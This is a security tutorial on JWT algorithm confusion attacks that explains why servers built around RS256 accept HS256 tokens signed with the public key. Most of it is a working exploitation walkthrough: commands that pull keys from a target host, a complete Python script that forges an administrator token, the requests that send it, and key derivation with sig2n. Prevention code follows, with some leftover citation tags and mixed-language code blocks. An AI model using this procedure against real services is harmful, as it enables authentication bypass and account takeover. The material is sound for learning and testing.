# JWT Algorithm Confusion Attacks

Algorithm confusion (also called key confusion) is the most mathematically elegant JWT attack class — it requires no brute force, no injection, and no stolen secrets. The attack works by exploiting a fundamental mismatch between how a JWT library's generic `verify()` function works and how a developer assumes it works. When a server is built around RS256 (asymmetric), the developer passes the public key to `verify()`. If an attacker can make the server verify an HS256 token using that same call, the library will treat the RSA public key as an HMAC secret — and since the attacker *also knows the public key* (it's public), they can produce a valid signature for any token they want. 

**Fundamental principle: In RS256, only the server's private key can produce a valid signature — the public key can be freely distributed without compromising security. Algorithm confusion completely inverts this model: by switching to HS256, the attacker turns the public key into the HMAC secret, and since the public key is known, the attacker can sign anything.**

***

## The Vulnerability Root Cause

```javascript
// ── WHY MOST JWT LIBRARIES ARE VULNERABLE TO THIS ──────────────────────────
// Many libraries provide ONE generic verify() method that reads alg from the token.
// Developers pass a fixed key assuming the algorithm is always RS256.

// VULNERABLE: algorithm read from the (untrusted) token header
function verify(token, secretOrPublicKey) {
    algorithm = token.getAlgHeader();        // ← reads from ATTACKER-CONTROLLED header
    if (algorithm == "RS256") {
        // Use secretOrPublicKey as an RSA public key
        return rsa_verify(token, secretOrPublicKey);
    } else if (algorithm == "HS256") {
        // Use secretOrPublicKey as an HMAC secret
        return hmac_verify(token, secretOrPublicKey);  // ← public key used as HMAC secret!
    }
}

// Developer code (trusts library, assumes RS256):
publicKey = loadFromFile("public-key.pem");
token = request.getCookie("session");
verify(token, publicKey);              // ← developer passes public key, intending RS256
// → If attacker sends HS256 token:
//   library reads alg="HS256" → hmac_verify(token, publicKey) ← PUBLIC KEY = HMAC SECRET
//   attacker knows publicKey → signs with it → HMAC matches → token accepted ✓


// ── REAL-WORLD VULNERABLE PATTERNS ──────────────────────────────────────────

// Node.js (jsonwebtoken — vulnerable in versions before specific patches):
const jwt = require('jsonwebtoken');
const publicKey = fs.readFileSync('public-key.pem');

// VULNERABLE: no algorithms restriction
const decoded = jwt.verify(token, publicKey);
// → if token header says alg:HS256 → library signs with publicKey as HMAC secret ✓

// VULNERABLE: reads algorithm from token
const header = JSON.parse(Buffer.from(token.split('.')[0], 'base64').toString());
const decoded = jwt.verify(token, publicKey, { algorithm: header.alg }); // ← trusts header ✓

// VULNERABLE: tries multiple algorithms
for (const alg of ['RS256', 'HS256', 'ES256']) {
    try {
        return jwt.verify(token, publicKey, { algorithm: alg }); // ← tries HS256 with publicKey ✓
    } catch(e) { continue; }
}


// ── SECURE PATTERN: always hardcode the expected algorithm ──────────────────
// CORRECT (Node.js):
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] }); // ← ONLY RS256 ✓
// → Attacker sends HS256 → jwt throws: "invalid algorithm" ✗

// CORRECT (Python — PyJWT):
decoded = jwt.decode(token, public_key, algorithms=["RS256"])  # ← explicit whitelist ✓

// CVE-2022-29217 (PyJWT): vulnerable when using jwt.algorithms.get_default_algorithms()
// → includes HS256 in the list → algorithm confusion possible [web:246]
// CVE-2023-48238 (json-web-token Node.js): reads alg from header unconditionally [web:248]
// CVE-2024-54150: another algorithm confusion variant discovered 2024 [web:252]
```

***

## Mathematical Foundation: Why RS256 Public Key Works as HS256 Secret

```
─────────────────────────────────────────────────────────────────────────────
RS256 signing (server, legitimate):
  Private key (d, n) + message M:
  Signature S = M^d mod n        ← requires SECRET private key exponent d
  Verification: S^e mod n == M   ← requires only PUBLIC key exponent e and modulus n

HS256 signing (any party with the secret):
  Secret K + message M:
  Signature S = HMAC-SHA256(M, K)   ← requires SECRET key K
  Verification: HMAC-SHA256(M, K) == S   ← requires SAME secret K

Algorithm confusion bridge:
  K = public_key_bytes (PEM or DER encoding of the RSA public key)
  → Attacker computes: HMAC-SHA256(modified_header.modified_payload, public_key_bytes) = S
  → Server calls: verify(token, public_key_bytes)
  → Library reads alg=HS256 → computes: HMAC-SHA256(header.payload, public_key_bytes) = S'
  → S == S' ✓ → signature valid → token accepted

Why this is severe:
  RS256 security guarantee: only holder of PRIVATE KEY can forge tokens
  After confusion attack: anyone who knows the PUBLIC KEY can forge tokens
  The public key is... public. Available on /jwks.json, in TLS certificates,
  in documentation, in source code. The entire security model collapses.
─────────────────────────────────────────────────────────────────────────────
```

***

## Step-by-Step Exploitation

### Step 1: Obtain the Server's Public Key

```bash
# ── METHOD A: Fetch from JWKS endpoint ───────────────────────────────────────
curl https://target-website.com/.well-known/jwks.json
curl https://target-website.com/jwks.json
curl https://target-website.com/.well-known/openid-configuration \
     | python3 -c "import sys,json; print(json.load(sys.stdin)['jwks_uri'])"
# → then fetch the jwks_uri

# Typical JWKS response:
{
    "keys": [
        {
            "kty": "RSA",           ← key type: RSA
            "use": "sig",           ← used for signatures
            "e": "AQAB",            ← public exponent (Base64URL of 65537)
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9..."
            # n = modulus (Base64URL-encoded) — this IS the public key material
        }
    ]
}

# ── METHOD B: Extract from TLS certificate ─────────────────────────────────
openssl s_client -connect target-website.com:443 2>/dev/null | \
  openssl x509 -pubkey -noout
# → prints the RSA public key in PEM format directly ✓

# ── METHOD C: Check source code / documentation ───────────────────────────
# Many devs commit public keys to GitHub repos
# Search: github.com target-website.com "BEGIN PUBLIC KEY"
# Search: /.well-known/openid-configuration → jwks_uri

# ── METHOD D: Derive from existing JWT tokens (no exposed key) ─────────────
# Covered in detail in the next section
```

### Step 2: Convert Public Key to Correct Format

```python
# ── CRITICAL: the key bytes you sign with MUST be bit-for-bit identical ───────
# to what the server uses internally. Format matters.
# Most servers store their verification key as X.509 PEM.
# Even one extra or missing newline = different bytes = signature mismatch.

# ── Approach A: Burp Suite JWT Editor (GUI method) ───────────────────────────
# 1. JWT Editor Keys tab → "New RSA Key"
# 2. Paste the JWK JSON from the JWKS endpoint
# 3. Select "PEM" radio button → copy the PEM key
# 4. Decoder tab → paste PEM → "Encode as Base64"
# 5. JWT Editor Keys → "New Symmetric Key" → Generate
# 6. Replace the "k" value with your Base64-encoded PEM
# 7. Save the key


# ── Approach B: Manual Python conversion ─────────────────────────────────────
import base64, json
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import (
    Encoding, PublicFormat, load_der_public_key
)
from cryptography.hazmat.backends import default_backend

def jwk_to_pem(jwk: dict) -> bytes:
    """Convert a JWK RSA public key to X.509 PEM format."""
    from cryptography.hazmat.primitives.asymmetric.rsa import (
        RSAPublicNumbers
    )
    # Decode Base64URL → integer
    def b64url_to_int(s):
        # Add padding if needed
        padded = s + '=' * (-len(s) % 4)
        return int.from_bytes(base64.urlsafe_b64decode(padded), 'big')

    e = b64url_to_int(jwk['e'])
    n = b64url_to_int(jwk['n'])
    public_numbers = RSAPublicNumbers(e, n)
    public_key = public_numbers.public_key(default_backend())
    pem = public_key.public_bytes(
        encoding=Encoding.PEM,
        format=PublicFormat.SubjectPublicKeyInfo  # ← X.509 format
    )
    return pem

# Usage:
jwk = {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
    "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9..."
}
pem = jwk_to_pem(jwk)
print(pem.decode())
# -----BEGIN PUBLIC KEY-----
# MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAo+yy1wpYmffgXBxhAUJz
# HHocCuJolwDqql75ZWuCQ/cb33K2vh9...
# -----END PUBLIC KEY-----

# Base64-encode the PEM for use as a symmetric key "k" value:
pem_b64 = base64.b64encode(pem).decode()
print(pem_b64)
# → "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0K..."
# → This is the value you put in the "k" field of your symmetric JWK ✓
```

```
Format compatibility note:
─────────────────────────────────────────────────────────────────────────────
X.509 / SubjectPublicKeyInfo (SPKI) PEM:
  -----BEGIN PUBLIC KEY-----
  MIIBIjAN...
  -----END PUBLIC KEY-----
  → Most common server-side format
  → Use PublicFormat.SubjectPublicKeyInfo

PKCS#1 PEM (RSA-specific):
  -----BEGIN RSA PUBLIC KEY-----
  MIIBCgKC...
  -----END RSA PUBLIC KEY-----
  → Older format, still used by some applications
  → Use PublicFormat.PKCS1

If the attack fails with X.509 PEM:
  → Try PKCS1 PEM (the server might store keys in this format)
  → Try removing final newline
  → Try adding/removing the trailing \n after -----END PUBLIC KEY-----
  → Try DER (binary) encoding instead of PEM
  → The HMAC input must be exactly the bytes the server has stored ✓
```

### Step 3 & 4: Forge and Sign the Token

```python
# ── MANUAL FORGING: Complete Python implementation ────────────────────────────
import jwt, base64, json
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.backends import default_backend

# Server's JWK (from /jwks.json):
jwk = {
    "kty": "RSA", "e": "AQAB",
    "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
    "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw..."
}

# Step 1: Convert JWK to PEM
def b64url_to_int(s):
    return int.from_bytes(base64.urlsafe_b64decode(s + '=' * (-len(s) % 4)), 'big')

public_key = RSAPublicNumbers(
    e=b64url_to_int(jwk['e']),
    n=b64url_to_int(jwk['n'])
).public_key(default_backend())

pem_bytes = public_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
print("[+] Server public key (PEM):")
print(pem_bytes.decode())

# Step 2: Forge the JWT using pem_bytes as the HS256 secret
malicious_payload = {
    "iss": "portswigger",
    "sub": "administrator",           # ← change user to admin
    "role": "admin",
    "isAdmin": True,
    "exp": 9999999999
}

forged_token = jwt.encode(
    malicious_payload,
    pem_bytes,                        # ← RSA PUBLIC KEY used as HMAC secret ✓
    algorithm="HS256",                # ← switched from RS256 to HS256
    headers={
        "kid": jwk["kid"],            # ← keep same kid (or remove it)
        "alg": "HS256"                # ← overridden: was RS256
    }
)

print("\n[+] Forged HS256 JWT (signed with server's public key as HMAC secret):")
print(forged_token)

# ── VERIFICATION: What the vulnerable server does when it receives this token ─
# Server code (simplified):
#   decoded = verify(forged_token, publicKey)
#   → reads alg: "HS256" from header
#   → computes: HMAC-SHA256(header.payload, publicKey_bytes) == signature
#   → publicKey_bytes == pem_bytes == what we signed with
#   → match ✓ → token accepted → user = administrator ✓
```

```http
# ── SEND THE FORGED TOKEN ───────────────────────────────────────────────────
GET /admin HTTP/1.1
Host: target-website.com
Cookie: session=eyJhbGciOiJIUzI1NiIsImtpZCI6Ijc1ZDBl...   ← forged token
# OR:
Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6Ijc1ZDBl...

# Expected outcome on vulnerable server:
HTTP/1.1 200 OK
{"message": "Welcome, administrator. Admin panel follows..."}

# On secure server (algorithm hardcoded):
HTTP/1.1 401 Unauthorized
{"error": "Invalid token: invalid algorithm"}
```

***

## Deriving the Public Key When It's Not Exposed

When no JWKS endpoint exists, the public key can be mathematically derived from two JWT signatures over known messages. The `rsa_sign2n` tool automates this using the mathematical relationship between RSA signatures and the public key modulus. 

```
Mathematical basis:
─────────────────────────────────────────────────────────────────────────────
For RSA with public exponent e and modulus n:
  Signature S = M^d mod n   (where d = private key exponent)

Given two valid signatures S1, S2 for messages M1, M2:
  S1^e ≡ M1 (mod n)
  S2^e ≡ M2 (mod n)

A candidate for n can be derived:
  n | gcd(S1^e - M1, S2^e - M2)

This yields one or more candidate values of n (the RSA modulus).
Combined with e=65537 (standard public exponent), this reconstructs
the public key without ever having access to the private key.
→ The algorithm works because RSA signatures leak information about n.
→ Two signatures are sufficient in most cases.
→ The tool outputs multiple candidates — you identify the correct one by testing.
```

```bash
# ── STEP 1: Obtain two valid JWTs from the same server ───────────────────────
# Log in twice (or trigger two token issuances) to get:
TOKEN1="eyJraWQiOiI5MTM2ZGRiMyIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiJ3aWVuZXIifQ.sig1..."
TOKEN2="eyJraWQiOiI5MTM2ZGRiMyIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiJ3aWVuZXIifQ.sig2..."
# Requirements:
# → Both signed with the SAME private key (same kid / same key rotation period)
# → Payloads can differ — doesn't matter (the tool processes raw bytes)
# → Both must be RS256 tokens ✓

# ── STEP 2: Run the PortSwigger/sig2n Docker tool ─────────────────────────────
docker run --rm -it portswigger/sig2n "$TOKEN1" "$TOKEN2"

# Output (example):
# ─────────────────────────────────────────────────────────────────────────────
# [*] Trying n=candidate_1 (1023 bits):
#   X.509 PEM:
#     -----BEGIN PUBLIC KEY-----
#     MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC...
#     -----END PUBLIC KEY-----
#   PKCS1 PEM:
#     -----BEGIN RSA PUBLIC KEY-----
#     MIGJAoGBAL...
#     -----END RSA PUBLIC KEY-----
#   Tampered JWT (X.509):  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ...
#   Tampered JWT (PKCS1):  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ...
#
# [*] Trying n=candidate_2 (2048 bits):
#   X.509 PEM: ...
#   Tampered JWT (X.509):  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ...
#   Tampered JWT (PKCS1):  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ...
# ─────────────────────────────────────────────────────────────────────────────

# ── STEP 3: Identify the correct key candidate ────────────────────────────────
# The tool generates a pre-signed tampered JWT for EACH candidate key.
# These tampered JWTs modify the payload (e.g., sub=administrator).
# Test each in Burp Repeater:

GET /admin HTTP/1.1
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.[candidate1_X509_sig]

# → 401 Unauthorized → wrong key candidate
# → 200 OK ← correct key candidate ✓

GET /admin HTTP/1.1
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.[candidate2_X509_sig]
# → 200 OK ← this is the correct public key ✓


# ── STEP 4: Use the identified key to forge any token ──────────────────────────
# Once you know which candidate is correct, use that PEM as described above
# to sign arbitrary tokens via algorithm confusion ✓


# ── ALTERNATIVE: Use the standard jwt_forgery.py (more detailed output) ───────
git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n/standalone
pip3 install -r requirements.txt
python3 jwt_forgery.py "$TOKEN1" "$TOKEN2"
# → Same output as Docker version but with additional mathematical details
# → Shows the GCD computation and all candidate n values ✓
```

***

## Variations of Algorithm Confusion

```
─────────────────────────────────────────────────────────────────────────────
Variant 1: RS256 → HS256 (most common — covered above)
  Server expects: RS256 (private key signs, public key verifies)
  Attack: alg changed to HS256, token signed with public key as HMAC secret
  Precondition: library reads alg from token header; doesn't enforce RS256

Variant 2: ES256 → HS256 (ECDSA to HMAC)
  Server expects: ES256 (ECDSA with P-256 curve)
  Attack: same principle — change alg to HS256, sign with ECDSA public key bytes
  Less common: ECDSA public keys are smaller (64 bytes) vs RSA (256+ bytes)
  Some libraries treat ECDSA public key bytes as HMAC secret ✓

Variant 3: RS256 → RS384 / RS512 (within asymmetric family)
  Some servers accept multiple RSA variants
  Attack: change to a weaker or differently-validated variant
  Less severe: still asymmetric, harder to exploit without private key

Variant 4: PS256 → HS256 (RSASSA-PSS to HMAC)
  Server expects: PS256 (RSA-PSS padding instead of PKCS#1 v1.5)
  Attack: identical to RS256→HS256 (same public key material)
  RSASSA-PSS public keys have the same format as PKCS#1 public keys ✓

Variant 5: alg:none after algorithm confusion
  Some libraries: if alg:none is rejected at the top-level check,
  but algorithm confusion makes the library call hmac_verify("none"),
  the verify() call may pass on some edge cases
  → Less reliable; test if above variants fail

─────────────────────────────────────────────────────────────────────────────
Testing Matrix: what to try for each grant type
─────────────────────────────────────────────────────────────────────────────
Server uses RS256:
  ① Try alg:none → rejected? → server checks for this
  ② Try alg:HS256 signed with RSA public key (X.509 PEM)
  ③ If ② fails: try alg:HS256 signed with RSA public key (PKCS1 PEM)
  ④ If ③ fails: try alg:HS256 signed with base64-decoded public key bytes (DER)
  ⑤ If key not exposed: use sig2n to derive → test derived candidates

Server uses HS256:
  → No algorithm confusion possible (symmetric = no public key to exploit)
  → Fall back to: brute-force secret, kid injection, jku injection
```

***

## Real-World CVEs

| CVE | Library | Description |
|---|---|---|
| **CVE-2022-29217** | PyJWT (Python) | Using `jwt.algorithms.get_default_algorithms()` includes HS* algorithms; if RS256 server accepts HS256 signed with public key, bypass is possible |
| **CVE-2023-48238** | `json-web-token` (Node.js) | `alg` read directly from untrusted token header at line 86 of `index.js`; RS256 server exploitable with HS256 + public key |
| **CVE-2024-54150** | Various | Another library-level algorithm confusion variant discovered in late 2024 |
| **CVE-2017-11424** | PyJWT (Python, old) | Original key confusion CVE; `rsa_sign2n` was created partly to exploit this without knowing the public key |

***

## Prevention

```python
# ── CORRECT: Explicitly whitelist the algorithm server-side ──────────────────

# Node.js (jsonwebtoken):
const decoded = jwt.verify(token, publicKey, {
    algorithms: ['RS256']      # ← ONLY RS256; HS256 will throw immediately ✓
});

# Python (PyJWT):
decoded = jwt.decode(
    token,
    public_key,
    algorithms=["RS256"],      # ← explicit; NEVER get_default_algorithms() ✓
    options={"require": ["exp", "iss", "aud"]}
)

# Java (jjwt):
Jwts.parserBuilder()
    .require("alg", "RS256")   # ← require specific algorithm ✓
    .setSigningKey(publicKey)
    .build()
    .parseClaimsJws(token);

# Go (golang-jwt):
token, err := jwt.ParseWithClaims(tokenStr, claims,
    func(token *jwt.Token) (interface{}, error) {
        if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {  // ← type check ✓
            return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
        }
        return publicKey, nil
    })

# ── WHY type checking is better than string checking ─────────────────────────
# String check: if header["alg"] == "RS256" → bypassable with "Rs256", "RS256 "
# Type check:   if token.Method is not RSASigningMethod → catches all non-RSA ✓
```
